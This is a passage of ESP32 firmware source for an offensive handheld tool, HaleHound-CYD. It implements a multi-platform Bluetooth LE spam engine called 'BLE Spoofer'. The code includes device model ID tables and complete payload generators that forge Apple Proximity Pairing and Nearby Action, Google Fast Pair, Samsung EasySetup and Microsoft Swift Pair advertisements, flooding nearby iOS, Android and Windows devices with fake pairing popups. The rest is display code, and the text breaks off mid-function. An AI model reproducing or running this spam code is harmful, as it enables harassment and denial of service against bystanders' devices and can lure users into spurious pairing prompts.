// ═══════════════════════════════════════════════════════════════════════════
// HaleHound-CYD Bluetooth Attack Modules Implementation
// BLE Spoofer - Apple Device Popup Spam
// Created: 2026-02-06
// ═══════════════════════════════════════════════════════════════════════════

#include "bluetooth_attacks.h"
#include "shared.h"
#include "touch_buttons.h"
#include "utils.h"
#include "icon.h"
#include "nrf24_config.h"
#include <BLEDevice.h>
#include <BLEAdvertising.h>
#include <SPI.h>
#include "esp_gap_ble_api.h"
#include "esp_bt_main.h"
#include "esp_bt.h"
#include "esp_wifi.h"
#include <WiFi.h>
#include "skull_bg.h"
#include "ble_database.h"
#include <SD.h>
#include "spi_manager.h"
#include "wp_loot_viewer.h"

// ── Classic BT memory release ───────────────────────────────────────────
// ESP32 Bluedroid reserves ~28KB for Classic BT by default.
// HaleHound only uses BLE — release that memory once, permanently.
// Must be called BEFORE BLEDevice::init() triggers esp_bt_controller_init().
static bool g_classicBtReleased = false;
static void releaseClassicBtMemory() {
    if (!g_classicBtReleased) {
        esp_err_t err = esp_bt_controller_mem_release(ESP_BT_MODE_CLASSIC_BT);
        if (err == ESP_OK) {
            g_classicBtReleased = true;
            Serial.printf("[BLE] Classic BT memory released OK, heap: %u\n", ESP.getFreeHeap());
        } else {
            Serial.printf("[BLE] mem_release FAILED: 0x%x, heap: %u\n", err, ESP.getFreeHeap());
            // Don't set flag — try again next time
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// BLE SPOOFER - Multi-Platform BLE Spam Engine
// Targets: Apple iOS, Google Android, Samsung Galaxy, Microsoft Windows
// 7 Modes: Apple Popup, Sour Apple, Fast Pair, Samsung Buds,
//          Samsung Watch, Swift Pair, CHAOS (rotates all)
// Created: 2026-02-14 - Full rebuild with multi-platform support
// ═══════════════════════════════════════════════════════════════════════════

namespace BleSpoofer {

// ═══════════════════════════════════════════════════════════════════════════
// SPAM MODES
// ═══════════════════════════════════════════════════════════════════════════

enum SpamMode {
    MODE_APPLE_POPUP = 0,
    MODE_SOUR_APPLE,
    MODE_FAST_PAIR,
    MODE_SAMSUNG_BUDS,
    MODE_SAMSUNG_WATCH,
    MODE_SWIFT_PAIR,
    MODE_CHAOS,
    MODE_COUNT  // 7
};

static const char* MODE_NAMES[] = {
    "APPLE POPUP",
    "SOUR APPLE",
    "FAST PAIR",
    "SAMSUNG BUDS",
    "SAMSUNG WATCH",
    "SWIFT PAIR",
    "CHAOS"
};

static const char* MODE_TARGETS[] = {
    "iOS",
    "iOS",
    "Android",
    "Android",
    "Android",
    "Windows",
    "ALL"
};

// ═══════════════════════════════════════════════════════════════════════════
// APPLE POPUP - Proximity Pairing (Type 0x07)
// Triggers "Your [Device] is nearby" popup on iPhones/iPads
// Model byte at offset 7 in proximity pairing payload
// ═══════════════════════════════════════════════════════════════════════════

#define APPLE_COUNT 20

static const uint8_t APPLE_MODELS[APPLE_COUNT] = {
    0x02,  // AirPods
    0x0E,  // AirPods Pro
    0x0A,  // AirPods Max
    0x0F,  // AirPods Gen 2
    0x13,  // AirPods Gen 3
    0x14,  // AirPods Pro Gen 2
    0x19,  // AirPods 4
    0x24,  // AirPods Max USB-C
    0x03,  // PowerBeats 3
    0x0B,  // PowerBeats Pro
    0x0C,  // Beats Solo Pro
    0x11,  // Beats Studio Buds
    0x10,  // Beats Flex
    0x05,  // BeatsX
    0x06,  // Beats Solo 3
    0x09,  // Beats Studio 3
    0x17,  // Beats Studio Pro
    0x12,  // Beats Fit Pro
    0x16,  // Beats Studio Buds+
    0x1C   // PowerBeats Pro 2
};

static const char* APPLE_NAMES[APPLE_COUNT] = {
    "AirPods",
    "AirPods Pro",
    "AirPods Max",
    "AirPods Gen2",
    "AirPods Gen3",
    "AirPods Pro2",
    "AirPods 4",
    "AirPods MaxC",
    "PowerBeats3",
    "PowerBeatsPro",
    "Solo Pro",
    "Studio Buds",
    "Beats Flex",
    "BeatsX",
    "Beats Solo3",
    "Beats Studio3",
    "Studio Pro",
    "Beats FitPro",
    "Studio Buds+",
    "PBeatsPro2"
};

// ═══════════════════════════════════════════════════════════════════════════
// SOUR APPLE - Nearby Action (Type 0x0F)
// Floods iOS with random action modals (WiFi, AirDrop, HomeKit, etc.)
// ═══════════════════════════════════════════════════════════════════════════

#define SOUR_APPLE_COUNT 14

static const uint8_t SOUR_APPLE_TYPES[SOUR_APPLE_COUNT] = {
    0x01,  // Setup New iPhone
    0x02,  // Transfer Number
    0x05,  // AirDrop
    0x06,  // HomeKit
    0x09,  // WiFi Password
    0x0D,  // AirPlay
    0x14,  // AppleTV Setup
    0x1E,  // Handoff
    0x20,  // Setup AppleTV
    0x27,  // Setup Device
    0x2B,  // Connect to WiFi
    0x2D,  // Apple Vision Pro
    0x2F,  // HomePod Setup
    0xC0   // Setup Nearby
};

static const char* SOUR_APPLE_NAMES[SOUR_APPLE_COUNT] = {
    "New iPhone",
    "Transfer #",
    "AirDrop",
    "HomeKit",
    "WiFi Pass",
    "AirPlay",
    "AppleTV",
    "Handoff",
    "Setup ATV",
    "Setup Dev",
    "WiFi Net",
    "VisionPro",
    "HomePod",
    "Nearby"
};

// ═══════════════════════════════════════════════════════════════════════════
// GOOGLE FAST PAIR (Service UUID 0xFE2C)
// Triggers "Device ready to pair" notification on Android
// 3-byte Model ID determines device name/image in popup
// ═══════════════════════════════════════════════════════════════════════════

#define FAST_PAIR_COUNT 15

static const uint8_t FAST_PAIR_MODELS[FAST_PAIR_COUNT][3] = {
    {0xD9, 0x93, 0x30},  // Pixel Buds Pro
    {0x82, 0x1F, 0x66},  // Pixel Buds A-Series
    {0x71, 0x7F, 0x41},  // Pixel Buds
    {0xF5, 0x24, 0x94},  // Sony WH-1000XM4
    {0xF0, 0x09, 0x17},  // Sony WH-1000XM5
    {0x01, 0x00, 0x06},  // Bose NC 700
    {0xEF, 0x44, 0x63},  // Bose QC Ultra
    {0x03, 0x1E, 0x06},  // JBL Flip 6
    {0x92, 0xB2, 0x5E},  // JBL Live Pro 2
    {0x1E, 0x89, 0xA7},  // Razer Hammerhead
    {0x02, 0xAA, 0x91},  // Jabra Elite 75t
    {0x2D, 0x7A, 0x23},  // Nothing Ear (1)
    {0xD4, 0x46, 0xA7},  // Sony LinkBuds S
    {0x72, 0xEF, 0x62},  // Samsung Galaxy Buds FE
    {0xF5, 0x8D, 0x14}   // JBL Buds Pro
};

static const char* FAST_PAIR_NAMES[FAST_PAIR_COUNT] = {
    "Pixel BudsPro",
    "Pixel BudsA",
    "Pixel Buds",
    "Sony XM4",
    "Sony XM5",
    "Bose NC700",
    "Bose QC Ultra",
    "JBL Flip 6",
    "JBL LivePro2",
    "Razer HH",
    "Jabra 75t",
    "Nothing Ear1",
    "Sony LinkBuds",
    "Galaxy BudFE",
    "JBL BudsPro"
};

// ═══════════════════════════════════════════════════════════════════════════
// SAMSUNG BUDS (Company ID 0x0075)
// Triggers Samsung EasySetup pairing popup on Galaxy phones
// 3-byte Device ID split with 0x01 separator in packet
// ═══════════════════════════════════════════════════════════════════════════

#define SAMSUNG_BUDS_COUNT 20

static const uint8_t SAMSUNG_BUDS_IDS[SAMSUNG_BUDS_COUNT][3] = {
    {0xEE, 0x7A, 0x01},  // Galaxy Buds (2019)
    {0x9B, 0x7A, 0x01},  // Galaxy Buds+
    {0x9B, 0x7A, 0x02},  // Galaxy Buds+ Black
    {0x4E, 0x85, 0x01},  // Galaxy Buds Live
    {0x4E, 0x85, 0x02},  // Galaxy Buds Live Black
    {0x4E, 0x85, 0x03},  // Galaxy Buds Live White
    {0xA7, 0x2F, 0x01},  // Galaxy Buds Pro
    {0xA7, 0x2F, 0x02},  // Galaxy Buds Pro Silver
    {0xA7, 0x2F, 0x03},  // Galaxy Buds Pro Violet
    {0x74, 0x87, 0x01},  // Galaxy Buds2
    {0x74, 0x87, 0x02},  // Galaxy Buds2 White
    {0x74, 0x87, 0x03},  // Galaxy Buds2 Purple
    {0xAE, 0x59, 0x01},  // Galaxy Buds2 Pro
    {0xAE, 0x59, 0x02},  // Galaxy Buds2 Pro White
    {0xAE, 0x59, 0x03},  // Galaxy Buds2 Pro Gray
    {0x53, 0xD4, 0x01},  // Galaxy Buds FE
    {0x53, 0xD4, 0x02},  // Galaxy Buds FE White
    {0xB6, 0xC4, 0x01},  // Galaxy Buds3
    {0xB6, 0xC4, 0x02},  // Galaxy Buds3 Pro
    {0x11, 0xA0, 0x01}   // Galaxy Buds+ Rose
};

static const char* SAMSUNG_BUDS_NAMES[SAMSUNG_BUDS_COUNT] = {
    "Galaxy Buds",
    "Galaxy Buds+",
    "Buds+ Black",
    "Buds Live",
    "Buds Live B",
    "Buds Live W",
    "Buds Pro",
    "Buds Pro S",
    "Buds Pro V",
    "Buds2",
    "Buds2 White",
    "Buds2 Purple",
    "Buds2 Pro",
    "Buds2 Pro W",
    "Buds2 Pro G",
    "Buds FE",
    "Buds FE W",
    "Buds3",
    "Buds3 Pro",
    "Buds+ Rose"
};

// Samsung Buds fixed header and tail bytes for EasySetup protocol
static const uint8_t SAMSUNG_BUDS_HDR[] = {0x42, 0x09, 0x81, 0x02, 0x14, 0x15, 0x03, 0x21, 0x01, 0x09};
static const uint8_t SAMSUNG_BUDS_TAIL[] = {0x06, 0x3C, 0x94, 0x8E, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x00};

// ═══════════════════════════════════════════════════════════════════════════
// SAMSUNG WATCH (Company ID 0x0075)
// Triggers Samsung Watch pairing popup on Galaxy phones
// 1-byte Watch Model ID
// ═══════════════════════════════════════════════════════════════════════════

#define SAMSUNG_WATCH_COUNT 25

static const uint8_t SAMSUNG_WATCH_IDS[SAMSUNG_WATCH_COUNT] = {
    0x01,  // Galaxy Watch4 40mm
    0x02,  // Galaxy Watch4 44mm
    0x03,  // Galaxy Watch4 Classic 42mm
    0x04,  // Galaxy Watch4 Classic 46mm
    0x05,  // Galaxy Watch5 40mm
    0x06,  // Galaxy Watch5 44mm
    0x07,  // Galaxy Watch5 Pro 45mm
    0x08,  // Galaxy Watch6 40mm
    0x09,  // Galaxy Watch6 44mm
    0x0A,  // Galaxy Watch6 Classic 43mm
    0x0B,  // Galaxy Watch6 Classic 47mm
    0x0C,  // Galaxy Watch FE
    0x0D,  // Galaxy Watch Ultra
    0x0E,  // Galaxy Watch4 LTE
    0x0F,  // Galaxy Watch5 LTE
    0x10,  // Galaxy Watch6 LTE
    0x11,  // Galaxy Watch Active2 40mm
    0x12,  // Galaxy Watch Active2 44mm
    0x13,  // Galaxy Watch3 41mm
    0x14,  // Galaxy Watch3 45mm
    0x15,  // Galaxy Watch3 Active 41mm
    0x16,  // Galaxy Fit2
    0x17,  // Galaxy Fit3
    0x18,  // Galaxy Watch7 40mm
    0x19   // Galaxy Watch7 44mm
};

static const char* SAMSUNG_WATCH_NAMES[SAMSUNG_WATCH_COUNT] = {
    "Watch4 40",
    "Watch4 44",
    "Watch4C 42",
    "Watch4C 46",
    "Watch5 40",
    "Watch5 44",
    "Watch5 Pro",
    "Watch6 40",
    "Watch6 44",
    "Watch6C 43",
    "Watch6C 47",
    "Watch FE",
    "Watch Ultra",
    "Watch4 LTE",
    "Watch5 LTE",
    "Watch6 LTE",
    "Active2 40",
    "Active2 44",
    "Watch3 41",
    "Watch3 45",
    "Watch3A 41",
    "Fit2",
    "Fit3",
    "Watch7 40",
    "Watch7 44"
};

// Samsung Watch fixed header for pairing protocol
static const uint8_t SAMSUNG_WATCH_HDR[] = {0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xFF, 0x00, 0x00, 0x43};

// ═══════════════════════════════════════════════════════════════════════════
// MICROSOFT SWIFT PAIR (Company ID 0x0006)
// Triggers "New Bluetooth device found" on Windows 10/11
// Device name as ASCII string in advertisement
// ═══════════════════════════════════════════════════════════════════════════

#define SWIFT_PAIR_COUNT 10

static const char* SWIFT_PAIR_NAMES[SWIFT_PAIR_COUNT] = {
    "HH Speaker",
    "BT Mouse",
    "BT Keyboard",
    "Headphones",
    "Controller",
    "Earbuds",
    "Smart Watch",
    "Fitness",
    "BT Adapter",
    "Soundbar"
};

// ═══════════════════════════════════════════════════════════════════════════
// DEVICE COUNTS PER MODE
// ═══════════════════════════════════════════════════════════════════════════

static const int MODE_DEVICE_COUNTS[] = {
    APPLE_COUNT,          // 20
    SOUR_APPLE_COUNT,     // 14
    FAST_PAIR_COUNT,      // 15
    SAMSUNG_BUDS_COUNT,   // 20
    SAMSUNG_WATCH_COUNT,  // 25
    SWIFT_PAIR_COUNT,     // 10
    0                     // CHAOS uses all
};

// ═══════════════════════════════════════════════════════════════════════════
// STATE VARIABLES
// ═══════════════════════════════════════════════════════════════════════════

static bool initialized = false;
static volatile bool spamming = false;
static bool exitRequested = false;
static volatile int currentMode = MODE_APPLE_POPUP;
static int initialMode = -1;

static volatile uint32_t packetCount = 0;
static volatile uint32_t rateWindowCount = 0;
static volatile uint16_t currentRate = 0;

// Per-mode device index (persists when switching modes)
static volatile int deviceIndex[MODE_COUNT] = {0};
static int chaosStep = 0;

// ═══════════════════════════════════════════════════════════════════════════
// DUAL-CORE TASK MANAGEMENT
// Core 0: BLE broadcast engine (doBroadcast loop)
// Core 1: Display + touch (Arduino main loop)
// ═══════════════════════════════════════════════════════════════════════════

static TaskHandle_t spamTaskHandle = NULL;
static volatile bool spamTaskRunning = false;

// ═══════════════════════════════════════════════════════════════════════════
// SCROLLING BROADCAST LOG
// ═══════════════════════════════════════════════════════════════════════════

#define SP_LOG_MAX_LINES 12
#define SP_LOG_LINE_HEIGHT 12
#define SP_LOG_START_Y 95
#define SP_LOG_END_Y (tft.height() - 80)

static char logLines[SP_LOG_MAX_LINES][42];  // Fixed char buffers (no heap alloc)
static uint16_t logColors[SP_LOG_MAX_LINES];
static volatile int logCount = 0;
static volatile bool logDirty = false;  // Core 0 sets via addLogEntry, Core 1 reads in drawLog

// ═══════════════════════════════════════════════════════════════════════════
// SKULL ANIMATION - 2 rows of 8 (matches BLE Jammer pattern)
// ═══════════════════════════════════════════════════════════════════════════

#define SP_SKULL_Y (SCREEN_HEIGHT - 48)
#define SP_SKULL_ROWS 1
#define SP_SKULL_ROW_SPACING 15
#define SP_SKULL_NUM 8

static int skullFrame = 0;
static const unsigned char* spSkulls[SP_SKULL_NUM] = {
    bitmap_icon_skull_wifi,
    bitmap_icon_skull_bluetooth,
    bitmap_icon_skull_jammer,
    bitmap_icon_skull_subghz,
    bitmap_icon_skull_ir,
    bitmap_icon_skull_tools,
    bitmap_icon_skull_setting,
    bitmap_icon_skull_about
};

// ═══════════════════════════════════════════════════════════════════════════
// ICON BAR - 6 icons
// Back(10) | Toggle(60) | PrevMode(105) | NextMode(140) | PrevDev(180) | NextDev(215)
// ═══════════════════════════════════════════════════════════════════════════

#define SP_ICON_SIZE 16
#define SP_ICON_NUM 6

static const int spIconX[SP_ICON_NUM] = {10, 60, 105, 140, 180, 215};
static const unsigned char* spIcons[SP_ICON_NUM] = {
    bitmap_icon_go_back,           // 0: Back/Exit
    bitmap_icon_start,             // 1: Toggle spam ON/OFF
    bitmap_icon_sort_down_minus,   // 2: Previous mode
    bitmap_icon_sort_up_plus,      // 3: Next mode
    bitmap_icon_LEFT,              // 4: Previous device
    bitmap_icon_RIGHT              // 5: Next device
};

static unsigned long lastDisplayUpdate = 0;

// ═══════════════════════════════════════════════════════════════════════════
// HELPER FUNCTIONS
// ═══════════════════════════════════════════════════════════════════════════

static int getDeviceCount(int mode) {
    if (mode < 0 || mode >= MODE_COUNT) return 0;
    return MODE_DEVICE_COUNTS[mode];
}

static const char* getDeviceName(int mode, int idx) {
    switch (mode) {
        case MODE_APPLE_POPUP:   return (idx >= 0 && idx < APPLE_COUNT) ? APPLE_NAMES[idx] : "?";
        case MODE_SOUR_APPLE:    return (idx >= 0 && idx < SOUR_APPLE_COUNT) ? SOUR_APPLE_NAMES[idx] : "?";
        case MODE_FAST_PAIR:     return (idx >= 0 && idx < FAST_PAIR_COUNT) ? FAST_PAIR_NAMES[idx] : "?";
        case MODE_SAMSUNG_BUDS:  return (idx >= 0 && idx < SAMSUNG_BUDS_COUNT) ? SAMSUNG_BUDS_NAMES[idx] : "?";
        case MODE_SAMSUNG_WATCH: return (idx >= 0 && idx < SAMSUNG_WATCH_COUNT) ? SAMSUNG_WATCH_NAMES[idx] : "?";
        case MODE_SWIFT_PAIR:    return (idx >= 0 && idx < SWIFT_PAIR_COUNT) ? SWIFT_PAIR_NAMES[idx] : "?";
        case MODE_CHAOS:         return "CHAOS";
        default:                 return "?";
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// PAYLOAD GENERATORS
// ═══════════════════════════════════════════════════════════════════════════

// Apple Proximity Pairing (Type 0x07) - triggers iOS "nearby device" popup
static void getApplePopupPayload(BLEAdvertisementData& advData, int idx) {
    uint8_t pkt[31];
    pkt[0]  = 0x1E;  // AD Length (30 bytes follow)
    pkt[1]  = 0xFF;  // Manufacturer Specific Data
    pkt[2]  = 0x4C;  // Apple Inc (low byte)
    pkt[3]  = 0x00;  // Apple Inc (high byte)
    pkt[4]  = 0x07;  // Proximity Pairing type
    pkt[5]  = 0x19;  // Data length (25)
    pkt[6]  = 0x07;  // Prefix
    pkt[7]  = APPLE_MODELS[idx % APPLE_COUNT];  // Model byte
    pkt[8]  = 0x20;  // Common
    pkt[9]  = 0x75;  // Status
    pkt[10] = 0xAA;  // Battery
    pkt[11] = 0x30;  // Case
    pkt[12] = 0x01;  // Lid
    pkt[13] = 0x00;  // Color
    pkt[14] = 0x00;
    // Fill remaining 16 bytes with random data (makes each packet unique)
    esp_fill_random(&pkt[15], 16);
    advData.addData(std::string((char*)pkt, 31));
}

// Sour Apple Nearby Action (Type 0x0F) - floods iOS with action modals
static void getSourApplePayload(BLEAdvertisementData& advData, int typeIdx) {
    uint8_t pkt[17];
    int i = 0;
    pkt[i++] = 16;    // AD Length (16 bytes follow)
    pkt[i++] = 0xFF;  // Manufacturer Specific Data
    pkt[i++] = 0x4C;  // Apple Inc
    pkt[i++] = 0x00;
    pkt[i++] = 0x0F;  // Nearby Action type
    pkt[i++] = 0x05;  // Length
    pkt[i++] = 0xC1;  // Action flags
    pkt[i++] = SOUR_APPLE_TYPES[typeIdx % SOUR_APPLE_COUNT];
    // Random authentication tag (3 bytes)
    esp_fill_random(&pkt[i], 3);
    i += 3;
    pkt[i++] = 0x00;
    pkt[i++] = 0x00;
    pkt[i++] = 0x10;
    // Random tail (3 bytes)
    esp_fill_random(&pkt[i], 3);
    advData.addData(std::string((char*)pkt, 17));
}

// Google Fast Pair (Service UUID 0xFE2C) - triggers Android pairing notification
static void getFastPairPayload(BLEAdvertisementData& advData, int idx) {
    uint8_t pkt[14];
    int i = 0;
    // Flags AD structure
    pkt[i++] = 0x02;  // Length
    pkt[i++] = 0x01;  // Flags type
    pkt[i++] = 0x06;  // General Discoverable + BR/EDR Not Supported
    // Complete List of 16-bit Service UUIDs
    pkt[i++] = 0x03;  // Length
    pkt[i++] = 0x03;  // Complete 16-bit UUID list type
    pkt[i++] = 0x2C;  // FE2C (little-endian low)
    pkt[i++] = 0xFE;  // FE2C (little-endian high)
    // Service Data (FE2C + 3-byte Model ID)
    pkt[i++] = 0x06;  // Length
    pkt[i++] = 0x16;  // Service Data type
    pkt[i++] = 0x2C;  // FE2C (little-endian low)
    pkt[i++] = 0xFE;  // FE2C (little-endian high)
    const uint8_t* model = FAST_PAIR_MODELS[idx % FAST_PAIR_COUNT];
    pkt[i++] = model[0];
    pkt[i++] = model[1];
    pkt[i++] = model[2];
    advData.addData(std::string((char*)pkt, 14));
}

// Samsung Galaxy Buds (Company ID 0x0075) - triggers Samsung EasySetup popup
static void getSamsungBudsPayload(BLEAdvertisementData& advData, int idx) {
    uint8_t pkt[31];
    int i = 0;
    // Flags
    pkt[i++] = 0x02;
    pkt[i++] = 0x01;
    pkt[i++] = 0x06;
    // Manufacturer Specific Data
    pkt[i++] = 0x1B;  // AD Length = 27 bytes follow
    pkt[i++] = 0xFF;  // Manufacturer Specific Data type
    pkt[i++] = 0x75;  // Samsung company ID (low)
    pkt[i++] = 0x00;  // Samsung company ID (high)
    // Fixed EasySetup header (10 bytes)
    memcpy(&pkt[i], SAMSUNG_BUDS_HDR, 10);
    i += 10;
    // Device ID with 0x01 separator (4 bytes from 3-byte ID)
    const uint8_t* id = SAMSUNG_BUDS_IDS[idx % SAMSUNG_BUDS_COUNT];
    pkt[i++] = id[0];
    pkt[i++] = id[1];
    pkt[i++] = 0x01;  // Separator
    pkt[i++] = id[2];
    // Fixed EasySetup tail (10 bytes)
    memcpy(&pkt[i], SAMSUNG_BUDS_TAIL, 10);
    i += 10;
    advData.addData(std::string((char*)pkt, 31));
}

// Samsung Galaxy Watch (Company ID 0x0075) - triggers Samsung Watch pairing popup
static void getSamsungWatchPayload(BLEAdvertisementData& advData, int idx) {
    uint8_t pkt[18];
    int i = 0;
    // Flags
    pkt[i++] = 0x02;
    pkt[i++] = 0x01;
    pkt[i++] = 0x06;
    // Manufacturer Specific Data
    pkt[i++] = 0x0E;  // AD Length = 14 bytes follow
    pkt[i++] = 0xFF;  // Manufacturer Specific Data type
    pkt[i++] = 0x75;  // Samsung company ID (low)
    pkt[i++] = 0x00;  // Samsung company ID (high)
    // Fixed watch pairing header (10 bytes)
    memcpy(&pkt[i], SAMSUNG_WATCH_HDR, 10);
    i += 10;
    // Watch model ID (1 byte)
    pkt[i++] = SAMSUNG_WATCH_IDS[idx % SAMSUNG_WATCH_COUNT];
    advData.addData(std::string((char*)pkt, 18));
}

// Microsoft Swift Pair (Company ID 0x0006) - triggers Windows "device found" popup
static void getSwiftPairPayload(BLEAdvertisementData& advData, int idx) {
    const char* name = SWIFT_PAIR_NAMES[idx % SWIFT_PAIR_COUNT];
    int nameLen = strlen(name);
    if (nameLen > 20) nameLen = 20;  // Stay within 31-byte total limit

    uint8_t pkt[31];
    int i = 0;
    // Flags
    pkt[i++] = 0x02;
    pkt[i++] = 0x01;
    pkt[i++] = 0x06;
    // Manufacturer Specific Data
    pkt[i++] = (uint8_t)(6 + nameLen);  // AD Length
    pkt[i++] = 0xFF;  // Manufacturer Specific Data type
    pkt[i++] = 0x06;  // Microsoft company ID (low)
    pkt[i++] = 0x00;  // Microsoft company ID (high)
    pkt[i++] = 0x03;  // Swift Pair beacon type
    pkt[i++] = 0x00;  // Sub-scenario: LE only
    pkt[i++] = 0x80;  // Display name flag
    // Device name as ASCII
    memcpy(&pkt[i], name, nameLen);
    i += nameLen;
    advData.addData(std::string((char*)pkt, i));
}


// ═══════════════════════════════════════════════════════════════════════════
// UI DRAWING FUNCTIONS — Enhanced HaleHound Visual Suite
// FreeFont titles, double-border frames, skull watermark, gradient bars,
// pulsing status, activity EQ, broadcast flash effects
// ═══════════════════════════════════════════════════════════════════════════

// Free Fonts are included via TFT_eSPI when LOAD_GFXFF is enabled
// Available: FreeMonoBold9pt7b, FreeMonoBold12pt7b, FreeMonoBold18pt7b

// Activity EQ bars — 16 skinny bars that bounce with broadcast activity
#define SP_EQ_BARS 16
#define SP_EQ_HEIGHT 22
#define SP_EQ_Y (SCREEN_HEIGHT - 73)       // Just above skulls
#define SP_EQ_X 12
#define SP_EQ_WIDTH (SCREEN_WIDTH - 24)
static uint8_t eqHeat[SP_EQ_BARS] = {0};

// Pulsing status blink state
static bool statusBlink = false;

// Helper: draw centered FreeFont text
static void spDrawFreeFont(int y, const char* text, uint16_t color, const GFXfont* font) {
    tft.setFreeFont(font);
    tft.setTextColor(color, TFT_BLACK);
    int w = tft.textWidth(text);
    int x = (SCREEN_WIDTH - w) / 2;
    if (x < 0) x = 0;
    tft.setCursor(x, y);
    tft.print(text);
    tft.setFreeFont(NULL);
}

// Helper: gradient color from cyan to hot pink (ratio 0.0 → 1.0)
static uint16_t spGradientColor(float ratio) {
    if (ratio > 1.0f) ratio = 1.0f;
    if (ratio < 0.0f) ratio = 0.0f;
    uint8_t r = (uint8_t)(ratio * 255);
    uint8_t g = 207 - (uint8_t)(ratio * (207 - 28));
    uint8_t b = 255 - (uint8_t)(ratio * (255 - 82));
    return tft.color565(r, g, b);
}

static void drawIconBar() {
    tft.drawLine(0, ICON_BAR_TOP, SCREEN_WIDTH, ICON_BAR_TOP, HALEHOUND_MAGENTA);
    tft.fillRect(0, ICON_BAR_Y, SCREEN_WIDTH, ICON_BAR_H, HALEHOUND_GUNMETAL);
    for (int i = 0; i < SP_ICON_NUM; i++) {
        uint16_t color = HALEHOUND_MAGENTA;
        if (i == 1 && spamming) color = HALEHOUND_HOTPINK;  // Toggle icon hot when active
        tft.drawBitmap(spIconX[i], ICON_BAR_Y, spIcons[i], SP_ICON_SIZE, SP_ICON_SIZE, color);
    }
    tft.drawLine(0, ICON_BAR_BOTTOM, SCREEN_WIDTH, ICON_BAR_BOTTOM, HALEHOUND_HOTPINK);
}

static void drawHeader() {
    tft.fillRect(0, 40, SCREEN_WIDTH, 52, TFT_BLACK);

    // Skull watermark behind header (subtle dark cyan)
    tft.drawBitmap(180, 40, bitmap_icon_skull_bluetooth, 16, 16, tft.color565(0, 30, 40));

    // Title — Nosifer with glitch effect
    drawGlitchText(SCALE_Y(60), "BLE SPOOFER", &Nosifer_Regular10pt7b);

    // Status — pulsing when active
    tft.setTextSize(1);
    if (spamming) {
        statusBlink = !statusBlink;
        uint16_t statusColor = statusBlink ? HALEHOUND_HOTPINK : tft.color565(200, 50, 100);
        tft.setTextColor(statusColor, TFT_BLACK);
        tft.setCursor(88, 68);
        tft.print(">> ACTIVE <<");
    } else {
        tft.setTextColor(HALEHOUND_GUNMETAL, TFT_BLACK);
        tft.setCursor(95, 68);
        tft.print("- IDLE -");
    }

    // Mode — in rounded double-border frame
    tft.drawRoundRect(5, 74, GRAPH_PADDED_W, 16, 3, HALEHOUND_VIOLET);
    tft.drawRoundRect(6, 75, GRAPH_PADDED_W - 2, 14, 2, HALEHOUND_GUNMETAL);
    tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
    tft.setCursor(10, 78);
    tft.printf(" %s", MODE_NAMES[currentMode]);

    // Device name + platform target on right side of frame
    if (currentMode == MODE_CHAOS) {
        tft.setCursor(150, 78);
        tft.setTextColor(HALEHOUND_HOTPINK, TFT_BLACK);
        tft.print("[ALL]");
    } else {
        int devCount = getDeviceCount(currentMode);
        if (devCount > 0) {
            // Truncate device name to fit
            char devBuf[22];
            snprintf(devBuf, sizeof(devBuf), "%s", getDeviceName(currentMode, deviceIndex[currentMode]));
            tft.setCursor(130, 78);
            tft.setTextColor(HALEHOUND_VIOLET, TFT_BLACK);
            tft.print(devBuf);
        }
    }

    tft.drawLine(0, 92, SCREEN_WIDTH, 92, HALEHOUND_HOTPINK);
}

static void addLogEntry(const char* text, uint16_t color) {
    // Scroll up if buffer is full
    if (logCount >= SP_LOG_MAX_LINES) {
        memmove(logLines[0], logLines[1], (SP_LOG_MAX_LINES - 1) * sizeof(logLines[0]));
        memmove(logColors, logColors + 1, (SP_LOG_MAX_LINES - 1) * sizeof(uint16_t));
        logCount = SP_LOG_MAX_LINES - 1;
    }

    strncpy(logLines[logCount], text, sizeof(logLines[0]) - 1);
    logLines[logCount][sizeof(logLines[0]) - 1] = '\0';
    logColors[logCount] = color;
    logCount++;
    logDirty = true;  // Display update happens in loop() at 10fps
}

// Redraw log area — only called from display update section (10fps)
static void drawLog() {
    if (!logDirty) return;
    logDirty = false;

    tft.fillRect(0, SP_LOG_START_Y, SCREEN_WIDTH, SP_LOG_END_Y - SP_LOG_START_Y, TFT_BLACK);

    // Subtle skull watermark behind log (very dark)
    tft.drawBitmap(112, 155, bitmap_icon_skull_bluetooth, 16, 16, tft.color565(0, 18, 25));

    tft.setTextSize(1);
    for (int i = 0; i < logCount; i++) {
        tft.setTextColor(logColors[i], TFT_BLACK);
        tft.setCursor(3, SP_LOG_START_Y + i * SP_LOG_LINE_HEIGHT);
        tft.print(logLines[i]);
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// ACTIVITY EQUALIZER — 16 bars that react to broadcast activity
// Cyan-to-hot-pink gradient, bounces when spamming, decays when idle
// ═══════════════════════════════════════════════════════════════════════════

static void updateEqHeat() {
    if (spamming) {
        // Spike random bars on each frame — simulates broadcast energy
        for (int i = 0; i < SP_EQ_BARS; i++) {
            // Each bar has a chance to spike
            if (random(100) < 60) {
                int spike = 60 + random(65);  // 60-124
                eqHeat[i] = (eqHeat[i] + spike) / 2;
            } else {
                // Gentle decay
                eqHeat[i] = eqHeat[i] * 3 / 4;
            }
            if (eqHeat[i] > 124) eqHeat[i] = 124;
        }
    } else {
        // Fast decay when stopped
        for (int i = 0; i < SP_EQ_BARS; i++) {
            eqHeat[i] = eqHeat[i] / 2;
        }
    }
}

static void drawEqualizer() {
    updateEqHeat();

    int barWidth = SP_EQ_WIDTH / SP_EQ_BARS;
    int maxBarH = SP_EQ_HEIGHT - 4;

    // Clear EQ area
    tft.fillRect(SP_EQ_X - 1, SP_EQ_Y, SP_EQ_WIDTH + 2, SP_EQ_HEIGHT, TFT_BLACK);

    // Frame around EQ
    tft.drawRect(SP_EQ_X - 2, SP_EQ_Y - 1, SP_EQ_WIDTH + 4, SP_EQ_HEIGHT + 2, HALEHOUND_GUNMETAL);

    bool hasHeat = false;
    for (int i = 0; i < SP_EQ_BARS; i++) {
        if (eqHeat[i] > 3) { hasHeat = true; break; }
    }

    if (!hasHeat && !spamming) {
        // Standby — tiny flat bars
        for (int i = 0; i < SP_EQ_BARS; i++) {
            int x = SP_EQ_X + (i * barWidth);
            int barH = 3 + (i % 3);
            int barY = SP_EQ_Y + SP_EQ_HEIGHT - barH - 2;
            tft.fillRect(x + 1, barY, barWidth - 2, barH, HALEHOUND_GUNMETAL);
        }
        return;
    }

    // Draw active bars with gradient
